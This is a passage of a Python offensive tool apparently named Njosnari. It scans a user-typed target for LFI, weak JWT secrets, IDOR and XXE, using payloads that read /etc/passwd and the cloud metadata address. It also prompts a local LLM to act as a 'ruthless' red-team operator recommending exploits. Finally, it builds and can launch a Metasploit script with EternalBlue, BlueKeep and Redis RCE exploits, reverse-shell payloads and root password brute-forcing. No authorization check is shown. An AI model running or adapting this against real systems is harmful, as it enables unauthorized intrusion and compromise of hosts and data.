    parsed = urllib.parse.urlparse(base)
    tested = 0

    for param in LFI_PARAMS:
        for payload in LFI_PAYLOADS:
            tested += 1
            qs   = urllib.parse.urlencode({param: payload})
            test = urllib.parse.urlunparse(parsed._replace(query=qs))
            try:
                status, _, body = http_get(test, timeout=5)
                body_str = (body or b"").decode("utf-8", errors="replace")

                # LFI evidence
                if "root:x:0:0" in body_str or "/bin/bash" in body_str:
                    entry = {"param": param, "payload": payload, "evidence": "/etc/passwd"}
                    results["vulnerable"].append(entry)
                    tprint(mod_crit(
                        f"LFI CONFIRMED → param={C.BLOOD}{param}{C.RESET} "
                        f"payload={payload!r}"
                    ))
                elif "php://" in payload and re.search(r'[A-Za-z0-9+/]{40,}={0,2}', body_str):
                    # Base64-encoded PHP source
                    entry = {"param": param, "payload": payload, "evidence": "base64_php_source"}
                    results["vulnerable"].append(entry)
                    tprint(mod_crit(
                        f"PHP FILTER CHAIN LFI → param={C.BLOOD}{param}{C.RESET} "
                        f"(base64 PHP source leaked)"
                    ))
            except Exception:
                pass

    results["tested"] = tested
    if not results["vulnerable"]:
        tprint(mod_ok(f"No LFI detected across {tested} test cases."))
    save_finding(module, results)


# ── [26] JWT Weakness Checker ────────────────────────────────────────────────
def _jwt_decode_part(p: str) -> dict:
    """Base64url-decode a single JWT segment (header or payload) to a dict.
    Module-level so it isn't recreated on every loop iteration in scan_jwt()."""
    p += "=" * (4 - len(p) % 4)
    return json.loads(base64.urlsafe_b64decode(p))

def scan_jwt() -> None:
    module = "26_jwt"
    url    = state["target_url"]
    tprint(mod_header(26, "JWT Weakness Checker — alg:none / Weak HMAC / RS→HS / Expiry"))
    results = {"jwts": [], "issues": []}

    # Collect potential JWTs from headers and cookies
    status, headers, body = http_get(url, timeout=8)
    body_str = body.decode("utf-8", errors="replace") if body else ""
    h        = {k.lower(): v for k, v in headers.items()}

    jwt_candidates: List[str] = []

    # From auth headers
    auth = h.get("authorization", "")
    if auth.lower().startswith("bearer "):
        jwt_candidates.append(auth[7:])

    # From cookies
    for k, v in h.items():
        if "set-cookie" in k.lower():
            for part in v.split(";"):
                val = part.strip().split("=", 1)
                if len(val) == 2 and re.match(r'^eyJ', val[1].strip()):
                    jwt_candidates.append(val[1].strip())

    # From JS in page body
    jwt_matches = re.findall(r'eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]+', body_str)
    jwt_candidates.extend(jwt_matches)

    if not jwt_candidates:
        tprint(mod_info("No JWT tokens found on the main page."))
        save_finding(module, results); return

    for raw_jwt in set(jwt_candidates[:5]):
        try:
            parts = raw_jwt.split(".")
            if len(parts) != 3:
                continue

            header  = _jwt_decode_part(parts[0])
            payload = _jwt_decode_part(parts[1])

            alg  = header.get("alg", "unknown").lower()
            exp  = payload.get("exp", None)
            typ  = header.get("typ", "").upper()

            jwt_info = {"jwt": raw_jwt[:40] + "...", "header": header, "payload": payload}
            results["jwts"].append(jwt_info)

            tprint(mod_info(f"JWT found — alg={alg} typ={typ}"))
            tprint(mod_info(f"  Payload: {json.dumps(payload)[:150]}"))

            # alg:none
            if alg == "none":
                tprint(mod_crit("JWT algorithm is 'none' — UNSIGNED token accepted!"))
                results["issues"].append({"jwt_prefix": raw_jwt[:40], "issue": "ALG_NONE"})

            # RS256 → HS256 confusion
            if "rs" in alg:
                tprint(mod_warn(
                    "RS256 detected — test RS→HS algorithm confusion: "
                    "sign with public key as HMAC secret."
                ))
                results["issues"].append({"issue": "RS_TO_HS_CONFUSION_RISK"})

            # Weak HMAC — common secrets
            if "hs" in alg:
                weak_secrets = ["secret", "password", "123456", "key", "changeme",
                                "supersecret", "jwt_secret", "mysecret"]
                header_b64   = parts[0]
                payload_b64  = parts[1]
                for secret in weak_secrets:
                    sig_test = base64.urlsafe_b64encode(
                        hmac.new(
                            secret.encode(),
                            f"{header_b64}.{payload_b64}".encode(),
                            hashlib.sha256
                        ).digest()
                    ).rstrip(b"=").decode()
                    if sig_test == parts[2]:
                        tprint(mod_crit(f"WEAK JWT SECRET: '{secret}'!"))
                        results["issues"].append({"issue": "WEAK_HMAC_SECRET", "secret": secret})

            # Expiry check
            if exp:
                exp_dt = datetime.datetime.utcfromtimestamp(exp)
                now    = datetime.datetime.utcnow()
                if exp_dt < now:
                    tprint(mod_warn(f"JWT expired at {exp_dt} — server may still accept it."))
                    results["issues"].append({"issue": "EXPIRED_JWT_MAY_BE_ACCEPTED"})
                else:
                    tprint(mod_info(f"JWT expires at {exp_dt} UTC."))
            else:
                tprint(mod_warn("JWT has no 'exp' claim — never expires."))
                results["issues"].append({"issue": "NO_EXPIRY_CLAIM"})

        except Exception as e:
            tprint(mod_err(f"JWT parse error: {e}"))

    save_finding(module, results)


# ── [27] IDOR Probe ──────────────────────────────────────────────────────────
IDOR_PARAMS = ["id", "user_id", "account_id", "order_id", "record_id",
               "file_id", "doc_id", "post_id", "item_id", "profile_id",
               "uid", "pid", "cid", "rid", "eid", "tid"]

def scan_idor() -> None:
    module = "27_idor"
    base   = state["target_url"]
    tprint(mod_header(27, "IDOR Probe — Numeric ID Enumeration in URLs and Params"))
    results = {"findings": [], "tested": 0}

    parsed = urllib.parse.urlparse(base)
    status0, _, body0 = http_get(base, timeout=6)
    baseline_len = len(body0) if body0 else 0

    # Test sequential IDs for each param
    test_ids = [1, 2, 3, 100, 1000, 9999, 99999]
    for param in IDOR_PARAMS[:8]:
        prev_status = None
        prev_len    = None
        for obj_id in test_ids:
            qs   = urllib.parse.urlencode({param: obj_id})
            test = urllib.parse.urlunparse(parsed._replace(query=qs))
            results["tested"] += 1
            status, _, body = http_get(test, timeout=5)
            body_len = len(body) if body else 0

            if status and status not in (401, 403, 404) and status < 400:
                # Check if different IDs return meaningfully different content
                if prev_len is not None and abs(body_len - prev_len) > 50:
                    entry = {"param": param, "id": obj_id, "status": status, "size": body_len}
                    results["findings"].append(entry)
                    tprint(mod_warn(
                        f"IDOR candidate → param={C.YELLOW}{param}{C.RESET} "
                        f"id={obj_id} HTTP {status} size={body_len}B"
                    ))
            prev_status = status
            prev_len    = body_len

    if not results["findings"]:
        tprint(mod_ok(f"No IDOR candidates found across {results['tested']} probes."))
    save_finding(module, results)


# ── [28] XXE Detection ───────────────────────────────────────────────────────
XXE_PAYLOADS = [
    # Basic external entity
    ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
     '<root>&xxe;</root>'),
    # OOB XXE
    ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/">]>'
     '<root>&xxe;</root>'),
    # Parameter entity
    ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]><root/>'),
]

XXE_ENDPOINTS = ["/api", "/upload", "/import", "/xml", "/soap", "/ws",
                 "/service", "/services", "/rss", "/feed", "/atom",
                 "/sitemap.xml", "/api/v1", "/api/v2"]

def scan_xxe() -> None:
    module = "28_xxe"
    base   = state["target_url"]
    tprint(mod_header(28, "XXE Detection — XML Endpoint Detection + Entity Injection"))
    results = {"xml_endpoints": [], "vulnerable": []}

    # Find XML-accepting endpoints
    for endpoint in XXE_ENDPOINTS:
        url = base.rstrip("/") + endpoint
        status, headers, body = http_get(url, timeout=5)
        h = {k.lower(): v.lower() for k, v in headers.items()}
        content_type = h.get("content-type", "")

        if status and status not in (404, 410):
            is_xml = "xml" in content_type or "application/soap" in content_type
            if is_xml or status in (200, 201, 400, 500):
                results["xml_endpoints"].append({"endpoint": endpoint, "status": status, "ct": content_type})
                tprint(mod_info(f"Potential XML endpoint: {endpoint} → HTTP {status}"))

                # Probe with XXE payload
                for xxe_payload in XXE_PAYLOADS:
                    try:
                        st, _, resp = http_request(
                            url,
                            method="POST",
                            headers={
                                "Content-Type": "application/xml",
                                "Accept":       "application/xml, text/xml, */*",
                            },
                            data=xxe_payload.encode(),
                            timeout=6,
                        )
                        resp_str = (resp or b"").decode("utf-8", errors="replace")
                        if "root:x:0:0" in resp_str or "daemon:" in resp_str:
                            entry = {
                                "endpoint":  endpoint,
                                "payload":   xxe_payload[:80],
                                "evidence":  resp_str[:200],
                            }
                            results["vulnerable"].append(entry)
                            tprint(mod_crit(
                                f"XXE CONFIRMED → {C.BLOOD}{endpoint}{C.RESET} "
                                f"returned /etc/passwd content!"
                            ))
                    except Exception:
                        pass

    if not results["vulnerable"]:
        tprint(mod_ok("No XXE vulnerabilities confirmed (manual review of XML endpoints recommended)."))
    save_finding(module, results)


# =============================================================================
#  ORCHESTRATOR — Run all 28 modules concurrently
# =============================================================================
def run_all_scanners() -> None:
    """
    Fire all 28 modules. Some must run sequentially (CVE depends on port scan;
    CORS needs host; etc.) — we split into three waves:
      Wave 1: Independent modules (no cross-dependencies)
      Wave 2: Modules that depend on wave-1 results
      Wave 3: Sequential-only modules
    """
    tprint(f"\n{C.BLOOD}{'━'*64}{C.RESET}")
    tprint(f"{C.BOLD}  ⚔  INITIATING RAID — 28 MODULES LAUNCHING  ⚔{C.RESET}")
    tprint(f"{C.BLOOD}{'━'*64}{C.RESET}\n")

    # Wave 1: independent (run concurrently)
    wave1 = [
        scan_security_headers,
        scan_tls_ssl,
        scan_sensitive_paths,
        scan_cookie_security,
        scan_cors,
        scan_http_methods,
        scan_ports,               # needed by 08, 09
        scan_tech_fingerprint,    # needed by 09
        scan_subdomains,
        scan_dns_email_security,
        scan_waf_cdn,
        scan_js_secrets,
        scan_request_smuggling,
        scan_directory_fuzz,
        scan_ssrf,
        scan_clickjacking,
        scan_auth,
        scan_asn_reputation,
        scan_google_dorks,
        scan_email_harvest,
        scan_lfi,
        scan_jwt,
        scan_idor,
        scan_xxe,
        scan_sqli,
        scan_xss,
        scan_open_redirect,
    ]

    # Port scan and tech fingerprint need to finish before CVE scan
    with concurrent.futures.ThreadPoolExecutor(max_workers=14) as ex:
        futures = {ex.submit(fn): fn.__name__ for fn in wave1 if fn not in [scan_cve]}
        for fut in concurrent.futures.as_completed(futures):
            name = futures[fut]
            try:
                fut.result()
            except Exception as e:
                tprint(mod_err(f"[ORCHESTRATOR] {name} crashed: {e}"))

    # Wave 2: CVE scan (depends on port scan + tech fingerprint)
    try:
        scan_cve()
    except Exception as e:
        tprint(mod_err(f"[CVE Scan] crashed: {e}"))


# =============================================================================
#  VALHALLA LLM ENGINE — Ollama Integration
# =============================================================================
def call_ollama(prompt: str, system: str = "", timeout: int = 120) -> str:
    """POST to local Ollama and return streamed response text."""
    payload = {
        "model":  OLLAMA_MODEL,
        "prompt": prompt,
        "stream": True,
    }
    if system:
        payload["system"] = system

    body_bytes = json.dumps(payload).encode("utf-8")
    try:
        req  = urllib.request.Request(
            OLLAMA_URL,
            data   = body_bytes,
            headers = {"Content-Type": "application/json"},
            method  = "POST",
        )
        full_response = ""
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            for raw_line in resp:
                line = raw_line.decode("utf-8", errors="replace").strip()
                if not line:
                    continue
                try:
                    chunk = json.loads(line)
                    token = chunk.get("response", "")
                    full_response += token
                    tprint(token, end="")
                    if chunk.get("done"):
                        break
                except json.JSONDecodeError:
                    pass
        tprint("")  # newline after streamed response
        return full_response
    except Exception as e:
        return f"[Ollama unavailable: {e}]"

def valhalla_raid_report(findings_json: str) -> str:
    """Send raw findings to Ollama for attack surface analysis."""
    tprint(f"\n{C.BLOOD}{'━'*64}{C.RESET}")
    tprint(f"{C.BOLD}{C.RED}  ⚔  VALHALLA RAID REPORT — LLM ATTACK SURFACE ANALYSIS  ⚔{C.RESET}")
    tprint(f"{C.BLOOD}{'━'*64}{C.RESET}\n")

    system = (
        "You are an elite offensive cybersecurity analyst and red team operator. "
        "Your task is to analyse raw reconnaissance data from a live target system "
        "and produce an aggressive, technical attack surface assessment. "
        "Identify the highest-impact vulnerabilities, prioritise exploit paths, "
        "and describe exactly how an attacker would leverage each finding. "
        "Be specific, technical, and ruthless in your assessment. "
        "Format your output with clear sections: "
        "CRITICAL FINDINGS, HIGH RISK, MEDIUM RISK, ATTACK VECTORS, RECOMMENDED EXPLOITS."
    )

    prompt = (
        f"Analyse the following raw reconnaissance data from the target system. "
        f"Identify all exploitable vulnerabilities, attack chains, and provide specific "
        f"exploitation recommendations:\n\n{findings_json}"
    )

    tprint(f"{C.CYAN}[LLM]{C.RESET} Streaming Valhalla analysis...\n")
    analysis = call_ollama(prompt, system=system, timeout=180)
    return analysis


# =============================================================================
#  METASPLOIT BRIDGE
# =============================================================================
def generate_msf_rc(target: str, open_ports: List[Dict],
                    vulnerabilities: List[Dict], output_path: Path) -> str:
    """
    Generate a Metasploit Resource Script (.rc) based on discovered services
    and vulnerabilities from the Valhalla analysis.
    """
    lines = [
        "# ================================================================",
        "# Njosnari — Auto-Generated Metasploit Resource Script",
        f"# Target  : {target}",
        f"# Generated: {datetime.datetime.utcnow().isoformat()}",
        "# Author  : @s.k.7.l.d / SK7LD",
        "# ================================================================",
        "",
        "spool /tmp/njosnari_msf_output.txt",
        "setg RHOSTS " + state.get("target_ip", target),
        f"setg LHOST 0.0.0.0",
        "setg LPORT 4444",
        "",
    ]

    service_to_module = {
        22:    [("auxiliary/scanner/ssh/ssh_version", {}),
                ("auxiliary/scanner/ssh/ssh_login",   {"USERNAME": "root", "PASS_FILE": "/usr/share/wordlists/rockyou.txt"})],
        21:    [("auxiliary/scanner/ftp/ftp_version", {}),
                ("exploit/unix/ftp/vsftpd_234_backdoor", {"PAYLOAD": "cmd/unix/interact"})],
        23:    [("auxiliary/scanner/telnet/telnet_version", {}),
                ("auxiliary/scanner/telnet/telnet_login", {"USERNAME": "admin"})],
        25:    [("auxiliary/scanner/smtp/smtp_version", {}),
                ("auxiliary/scanner/smtp/smtp_enum",    {})],
        80:    [("auxiliary/scanner/http/http_version", {}),
                ("auxiliary/scanner/http/dir_scanner",   {"DICTIONARY": "/usr/share/dirb/wordlists/common.txt"})],
        443:   [("auxiliary/scanner/http/http_version", {})],
        3306:  [("auxiliary/scanner/mysql/mysql_version", {}),
                ("auxiliary/scanner/mysql/mysql_login",   {"USERNAME": "root"})],
        5432:  [("auxiliary/scanner/postgres/postgres_version", {}),
                ("auxiliary/scanner/postgres/postgres_login",   {})],
        6379:  [("auxiliary/scanner/redis/redis_info", {}),
                ("exploit/linux/redis/redis_replication_code_exec", {})],
        27017: [("auxiliary/scanner/mongodb/mongodb_login", {})],
        3389:  [("auxiliary/scanner/rdp/rdp_scanner", {}),
                ("exploit/windows/rdp/cve_2019_0708_bluekeep_rce", {})],
        5900:  [("auxiliary/scanner/vnc/vnc_none_auth",  {}),
                ("auxiliary/scanner/vnc/vnc_login",      {})],
        8080:  [("auxiliary/scanner/http/http_version", {}),
                ("auxiliary/scanner/http/tomcat_mgr_login", {})],
        445:   [("auxiliary/scanner/smb/smb_version",     {}),
                ("exploit/windows/smb/ms17_010_eternalblue", {"PAYLOAD": "windows/x64/meterpreter/reverse_tcp"})],
        139:   [("auxiliary/scanner/smb/smb_version", {})],
        161:   [("auxiliary/scanner/snmp/snmp_enum",       {"COMMUNITY": "public"}),
                ("auxiliary/scanner/snmp/snmp_enumshares", {})],
        9200:  [("auxiliary/scanner/elasticsearch/indices_enum", {})],
    }

    added_modules: set = set()

    for port_info in open_ports:
        port = port_info.get("port")
        if port in service_to_module:
            for module_path, opts in service_to_module[port]:
                if module_path not in added_modules:
                    added_modules.add(module_path)
                    lines.append(f"# Port {port} — {port_info.get('service', '')}")
                    lines.append(f"use {module_path}")
                    for k, v in opts.items():
                        lines.append(f"set {k} {v}")
                    lines.append("run -j")
                    lines.append("")

    # Vulnerability-triggered modules
    for vuln in vulnerabilities:
        cve = str(vuln.get("cve", ""))
        cve_to_module = {
            "CVE-2021-41773": "exploit/multi/http/apache_normalize_path_rce",
            "CVE-2021-42013": "exploit/multi/http/apache_normalize_path_rce",
            "CVE-2020-1938":  "exploit/multi/http/tomcat_cgi_cmdlineargs",
            "CVE-2022-22965": "exploit/multi/http/spring_framework_rce_spring4shell",
            "CVE-2019-0708":  "exploit/windows/rdp/cve_2019_0708_bluekeep_rce",
            "CVE-2017-0144":  "exploit/windows/smb/ms17_010_eternalblue",
        }
        for cve_key, msf_module in cve_to_module.items():
            if cve_key in cve and msf_module not in added_modules:
                added_modules.add(msf_module)
                lines.append(f"# CVE-triggered: {cve}")
                lines.append(f"use {msf_module}")
                lines.append("set PAYLOAD generic/shell_reverse_tcp")
                lines.append("run -j")
                lines.append("")

    lines += [
        "jobs -l",
        "sleep 10",
        "jobs -K",
        "",
        "# End of Njosnari RC Script",
    ]

    rc_content = "\n".join(lines)
    output_path.parent.mkdir(parents=True, exist_ok=True)
    output_path.write_text(rc_content)
    return rc_content

def run_metasploit_bridge(llm_analysis: str) -> str:
    """
    Parse LLM analysis + scanner results → generate RC → launch msfconsole.
    Returns MSF output or status string.
    """
    tprint(f"\n{C.BLOOD}{'━'*64}{C.RESET}")
    tprint(f"{C.BOLD}{C.RED}  ⚔  METASPLOIT INTEGRATION — VALHALLA ASSAULT  ⚔{C.RESET}")
    tprint(f"{C.BLOOD}{'━'*64}{C.RESET}\n")

    open_ports  = state["findings"].get("07_port_scan", {}).get("open", [])
    cves        = state["findings"].get("09_cve_scan",  {}).get("cves", [])

    if not open_ports:
        tprint(mod_warn("No open ports found — Metasploit RC will be minimal."))

    # Build RC file
    rc_path = OUTPUT_DIR / "njosnari_raid.rc"
    rc_content = generate_msf_rc(
        target         = state["target"],
        open_ports     = open_ports,
        vulnerabilities = cves,
        output_path    = rc_path,
    )

    tprint(mod_ok(f"Metasploit RC script written → {rc_path}"))
    tprint(f"\n{C.DIM}--- RC Script Preview ---{C.RESET}")
    for line in rc_content.splitlines()[:30]:
        tprint(f"  {C.DIM}{line}{C.RESET}")
    if len(rc_content.splitlines()) > 30:
        tprint(f"  {C.DIM}... ({len(rc_content.splitlines())} lines total){C.RESET}")

    # Check if msfconsole is available
    if not _which("msfconsole"):
        tprint(mod_warn(
            "msfconsole not found in PATH.\n"
            f"  Run manually: {C.CYAN}sudo msfconsole -q -r {rc_path}{C.RESET}"
        ))
        return f"MANUAL: sudo msfconsole -q -r {rc_path}"

    # Ask before firing
    tprint(f"\n{C.YELLOW}[?]{C.RESET} Launch msfconsole with the generated RC script? "
           f"[{C.GREEN}y{C.RESET}/{C.RED}N{C.RESET}] ", end="")
    try:
        answer = input().strip().lower()
    except (EOFError, KeyboardInterrupt):
        answer = "n"

    if answer != "y":
        tprint(mod_info(f"Skipped. Run: {C.CYAN}sudo msfconsole -q -r {rc_path}{C.RESET}"))
        return f"SKIPPED: rc={rc_path}"

    tprint(mod_info("Launching msfconsole — this may take a moment..."))
    try:
        result = subprocess.run(
            ["msfconsole", "-q", "-r", str(rc_path)],
            capture_output=True,
            text=True,
            timeout=300,
        )
        msf_output = result.stdout + result.stderr
        tprint(f"\n{C.DIM}--- MSF Output ---{C.RESET}")
        for line in msf_output.splitlines()[:50]:
            tprint(f"  {C.DIM}{line}{C.RESET}")
        return msf_output
    except subprocess.TimeoutExpired:
        tprint(mod_warn("msfconsole timed out after 5 minutes."))
        return "TIMEOUT"
    except Exception as e:
        tprint(mod_err(f"msfconsole launch failed: {e}"))
        return f"ERROR: {e}"


# =============================================================================
#  BUG BOUNTY REPORT GENERATOR
# =============================================================================
def generate_bug_bounty_report(msf_output: str, llm_analysis: str) -> str:
    """Feed MSF results + LLM analysis back into Ollama for professional report."""
    tprint(f"\n{C.BLOOD}{'━'*64}{C.RESET}")
    tprint(f"{C.BOLD}{C.RED}  ⚔  BUG BOUNTY REPORT — PROFESSIONAL WRITEUP  ⚔{C.RESET}")
    tprint(f"{C.BLOOD}{'━'*64}{C.RESET}\n")

    target   = state["target"]
    findings = state["findings"]

    # Summarise critical raw findings for the LLM
    critical_summary = {
        "target":          target,
        "open_ports":      findings.get("07_port_scan",    {}).get("open", [])[:10],
        "cves":            findings.get("09_cve_scan",     {}).get("cves", []),
        "sqli":            findings.get("10_sqli",         {}).get("vulnerable", []),
        "xss":             findings.get("11_xss",          {}).get("vulnerable", []),
        "lfi":             findings.get("25_lfi",          {}).get("vulnerable", []),
        "ssrf":            findings.get("19_ssrf",         {}).get("vulnerable", []),
        "cors":            findings.get("05_cors",         {}).get("findings", []),
        "exposed_paths":   findings.get("03_sensitive_paths", {}).get("exposed", []),
        "secrets":         findings.get("16_js_secrets",   {}).get("secrets", []),
        "jwt_issues":      findings.get("26_jwt",          {}).get("issues", []),
        "xxe":             findings.get("28_xxe",          {}).get("vulnerable", []),
        "open_redirect":   findings.get("12_open_redirect",{}).get("vulnerable", []),
        "spf_dmarc_issues": findings.get("14_dns_email",  {}).get("issues", []),
    }

    system = (
        "You are a senior penetration tester and security researcher writing a "
        "professional bug bounty vulnerability disclosure report. "
        "Your report must be formal, well-structured, and suitable for submission "
        "to a bug bounty platform (HackerOne, Bugcrowd, Intigriti). "
        "Each vulnerability must include: Severity (Critical/High/Medium/Low), "
        "CVSS Score estimate, Description, Proof of Concept, Impact, and Remediation. "
        "Use professional security terminology. Be specific and actionable."
    )

    prompt = (
        f"Generate a complete professional bug bounty vulnerability disclosure report "
        f"for the following target and findings.\n\n"
        f"TARGET: {target}\n\n"
        f"RAW FINDINGS:\n{json.dumps(critical_summary, indent=2)[:4000]}\n\n"
        f"LLM THREAT ANALYSIS:\n{llm_analysis[:2000]}\n\n"
        f"METASPLOIT VALIDATION:\n{msf_output[:1000]}\n\n"
        f"Format the report with:\n"
        f"1. Executive Summary\n"
        f"2. Vulnerability Details (one section per finding)\n"
        f"3. Attack Chain Scenarios\n"
        f"4. Remediation Roadmap\n"
        f"5. Conclusion"
    )

    tprint(f"{C.CYAN}[LLM]{C.RESET} Generating professional bug bounty report...\n")
    report = call_ollama(prompt, system=system, timeout=240)
    return report


# =============================================================================
#  SAVE REPORTS
# =============================================================================
def save_reports(llm_analysis: str, msf_output: str, bug_bounty: str) -> None:
    OUTPUT_DIR.mkdir(parents=True, exist_ok=True)
    timestamp = datetime.datetime.utcnow().strftime("%Y%m%d_%H%M%S")
    safe_target = re.sub(r'[^a-zA-Z0-9\-_.]', '_', state["target_host"])

    # Raw findings JSON
    json_path = OUTPUT_DIR / f"njosnari_{safe_target}_{timestamp}_raw.json"
    json_path.write_text(json.dumps({
        "target":    state["target"],
        "host":      state["target_host"],
        "ip":        state["target_ip"],
        "timestamp": timestamp,
        "findings":  state["findings"],
        "errors":    state["errors"],
    }, indent=2, default=str))

    # LLM analysis
    llm_path = OUTPUT_DIR / f"njosnari_{safe_target}_{timestamp}_valhalla.txt"
    llm_path.write_text(f"VALHALLA RAID REPORT — {state['target']}\n{'='*60}\n\n{llm_analysis}\n")

    # Bug bounty report
    bb_path  = OUTPUT_DIR / f"njosnari_{safe_target}_{timestamp}_bug_bounty.txt"
    bb_path.write_text(f"BUG BOUNTY REPORT — {state['target']}\n{'='*60}\n\n{bug_bounty}\n")

    tprint(f"\n{C.GREEN}[✓]{C.RESET} Reports saved:")
    tprint(f"    {C.CYAN}{json_path}{C.RESET}")
    tprint(f"    {C.CYAN}{llm_path}{C.RESET}")
    tprint(f"    {C.CYAN}{bb_path}{C.RESET}")


# =============================================================================
#  UTILITIES
# =============================================================================
def _which(cmd: str) -> Optional[str]:
    try:
        return subprocess.check_output(["which", cmd], stderr=subprocess.DEVNULL).decode().strip()
    except Exception:
        return None

def print_summary() -> None:
    """Print a quick summary of findings before LLM phase."""
    elapsed = time.time() - state["start_time"]
    tprint(f"\n{C.BLOOD}{'━'*64}{C.RESET}")
    tprint(f"{C.BOLD}  SCAN COMPLETE — {elapsed:.1f}s  |  Target: {state['target']}{C.RESET}")
    tprint(f"{C.BLOOD}{'━'*64}{C.RESET}")

    findings = state["findings"]
    def count(key, sub, *path):
        try:
            obj = findings.get(key, {})
            for p in path:
                obj = obj[p]
            return len(obj.get(sub, []))
        except Exception:
            return 0

    rows = [
        ("Open Ports",          count("07_port_scan",      "open")),
        ("Sensitive Paths",     count("03_sensitive_paths", "exposed")),
        ("SQLi",                count("10_sqli",            "vulnerable")),
        ("XSS",                 count("11_xss",             "vulnerable")),
        ("LFI",                 count("25_lfi",             "vulnerable")),
        ("SSRF",                count("19_ssrf",            "vulnerable")),
        ("XXE",                 count("28_xxe",             "vulnerable")),
        ("Secrets Found",       count("16_js_secrets",      "secrets")),
        ("Subdomains",          count("13_subdomains",      "found")),
        ("CVEs",                count("09_cve_scan",        "cves")),
        ("CORS Issues",         count("05_cors",            "findings")),
        ("JWT Issues",          count("26_jwt",             "issues")),
        ("Open Redirects",      count("12_open_redirect",   "vulnerable")),
    ]

    for label, n in rows:
        color = C.BLOOD if n > 0 else C.DIM
        tprint(f"  {color}{label:<22}{C.RESET} {n}")


# =============================================================================
#  MAIN
# =============================================================================
def main() -> None:
    # ── Banner ────────────────────────────────────────────────────────────────
    print(BANNER)

    # ── Target Input ──────────────────────────────────────────────────────────
    tprint(f"{C.BLOOD}┌──[{C.RESET}{C.BOLD}TARGET ACQUISITION{C.RESET}{C.BLOOD}]{'─'*44}┐{C.RESET}")
    tprint(f"{C.BLOOD}│{C.RESET}", end="")
    tprint(f"  Enter target IP or URL (e.g. 192.168.1.1 or https://example.com)")
    tprint(f"{C.BLOOD}│{C.RESET}", end="")

    try:
        raw_target = input(f"  {C.CYAN}⚔ Target:{C.RESET} ").strip()
    except (KeyboardInterrupt, EOFError):
        tprint(f"\n{C.RED}[!] Aborted.{C.RESET}")
        sys.exit(0)

    if not raw_target:
        tprint(f"{C.RED}[!] No target provided. Exiting.{C.RESET}")
        sys.exit(1)

    tprint(f"{C.BLOOD}└{'─'*60}┘{C.RESET}")

    # ── Resolve Target ────────────────────────────────────────────────────────
    url, host, ip = normalise_target(raw_target)

    state["target"]      = raw_target
    state["target_url"]  = url
    state["target_host"] = host
    state["target_ip"]   = ip
    state["start_time"]  = time.time()

    tprint(f"\n{C.DIM}  Target URL : {url}")
    tprint(f"  Host       : {host}")
    tprint(f"  IP Address : {ip}{C.RESET}\n")

    # Update CORS origins with real host
    CORS_ORIGINS[3] = f"https://{host}.evil.com"

    # ── Phase 1: Live Feed Scan ───────────────────────────────────────────────
    run_all_scanners()
    print_summary()

    # ── Phase 2: Valhalla Raid Report (LLM) ──────────────────────────────────
    findings_json = json.dumps(state["findings"], indent=2, default=str)
    llm_analysis  = valhalla_raid_report(findings_json[:8000])

    # ── Phase 3: Metasploit Integration ──────────────────────────────────────
    msf_output = run_metasploit_bridge(llm_analysis)

    # ── Phase 4: Bug Bounty Report ────────────────────────────────────────────
    # Only generate if exploits were found or LLM identified high-severity issues
    critical_found = any([
        state["findings"].get("10_sqli",     {}).get("vulnerable"),
        state["findings"].get("11_xss",      {}).get("vulnerable"),
        state["findings"].get("25_lfi",      {}).get("vulnerable"),
        state["findings"].get("19_ssrf",     {}).get("vulnerable"),
        state["findings"].get("28_xxe",      {}).get("vulnerable"),
        state["findings"].get("16_js_secrets", {}).get("secrets"),
        state["findings"].get("09_cve_scan", {}).get("cves"),
    ])

    bug_bounty = ""
    if critical_found or "CRITICAL" in llm_analysis.upper():
        bug_bounty = generate_bug_bounty_report(msf_output, llm_analysis)
    else:
        tprint(f"\n{C.DIM}[Info] No critical-severity findings detected — skipping bug bounty report.{C.RESET}")
        tprint(f"{C.DIM}       Run with full-permission scope to trigger full reporting.{C.RESET}")

    # ── Save Reports ──────────────────────────────────────────────────────────
    save_reports(llm_analysis, msf_output, bug_bounty)

    # ── Final Banner ──────────────────────────────────────────────────────────
    total = time.time() - state["start_time"]
    tprint(f"\n{C.BLOOD}{'━'*64}{C.RESET}")
    tprint(f"{C.BOLD}{C.RED}  ⚔  VALHALLA AWAITS — RAID COMPLETE IN {total:.1f}s  ⚔{C.RESET}")
    tprint(f"{C.DIM}  \"The ravens return. The raid is over.\" — @s.k.7.l.d{C.RESET}")
    tprint(f"{C.BLOOD}{'━'*64}{C.RESET}\n")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        tprint(f"\n\n{C.YELLOW}[!]{C.RESET} Interrupted by user — Odin's will.")
        sys.exit(0)
    except Exception as e:
        tprint(f"\n{C.BLOOD}[FATAL]{C.RESET} {e}")
        import traceback; traceback.print_exc()
        sys.exit(1)

